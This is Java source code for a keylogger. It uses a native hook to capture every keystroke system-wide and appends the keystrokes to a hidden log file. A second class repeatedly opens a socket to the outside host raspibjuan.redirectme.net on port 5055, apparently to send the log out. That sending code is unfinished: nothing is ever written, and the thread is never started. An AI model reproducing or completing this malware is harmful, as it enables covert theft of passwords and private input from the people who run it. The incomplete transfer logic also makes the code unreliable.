package keylogger;

import java.io.BufferedInputStream;
import java.io.BufferedOutputStream;
import java.io.BufferedWriter;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.FileWriter;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.ServerSocket;
import java.net.Socket;
import java.net.UnknownHostException;

import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;


public class MainKey implements NativeKeyListener {
	private String aux = "";
	private static log keylog = new log();
	
//C:\Users\EA6259\Documents\juan\Proyectos-JAVA.git\branches\mantenimiento-1\keylogger\.	
	public static void main(String[] args) {
			
		
		try {
			GlobalScreen.registerNativeHook();
		} catch (NativeHookException e) {
			
			e.printStackTrace();
		}
			GlobalScreen.getInstance().addNativeKeyListener(new MainKey());
			
			keylog.creaDir();
			
			enviaLog logtrx = new enviaLog(keylog.getPath());
			
}
	@Override
	public void nativeKeyPressed(NativeKeyEvent e) {
		aux = NativeKeyEvent.getKeyText(e.getKeyCode());
		if (!aux.equals("Intro") && !aux.equals("Retroceso") && !aux.equals("Suprimir")){
			if(aux.equals("Espacio")){
				aux = "-" + aux + "-";
			}
			System.out.print(aux);
			keylog.escribir(aux, keylog.getPath());
		}
	}

	@Override
	public void nativeKeyReleased(NativeKeyEvent e) {
		
	}

	@Override
	public void nativeKeyTyped(NativeKeyEvent e) {
		
	}

	

}



class enviaLog extends Thread{

	 private String path;	
	 private FileInputStream fis = null;
	 private BufferedInputStream bis = null;
	 private OutputStream os = null;
	 private ServerSocket servsock = null;
	 private Socket sock = null;
	
	public enviaLog(String p){
		path = p;
	}

	public void run(){
		
		try{
			while(true){
		      sock = new Socket("raspibjuan.redirectme.net", 5055);
		      File log = new File (path);
	          byte [] mybytearray  = new byte [(int)log.length()];
	          fis = new FileInputStream(log);
	          bis = new BufferedInputStream(fis);
		     
			}
		}catch(IOException e){
			
		}
	}

}


class log{
	
	private BufferedWriter log;
	private File fileLog;
	private static String path = "";
	
	
	public void creaDir(){
		
		String appPath = "";
		File ArchivoLog;
		appPath = new File(".").getAbsolutePath();
		for(int i = 0, c = 0; i < appPath.length() && c < 5; i++){
			if(appPath.charAt(i) == '\\' || appPath.charAt(i) == '/'){
				c++;
				path += appPath.charAt(i);
			}else{
				path += appPath.charAt(i);
			}
		}			
		
		path += "log";
		//crea carpeta en el directorio
		ArchivoLog = new File(path);
		if(!ArchivoLog.exists()){
			ArchivoLog.mkdirs();
		}
	}
	
	public String getPath(){
		return path;
	}

	
	
	public void escribir(String s, String path){
		
		try {
			log = new BufferedWriter(new FileWriter(path + "\\log.txt",true));
			log.write(s);
			log.close();
		} catch (IOException e) {
			
			e.printStackTrace();
		}
		
		
	}
	
}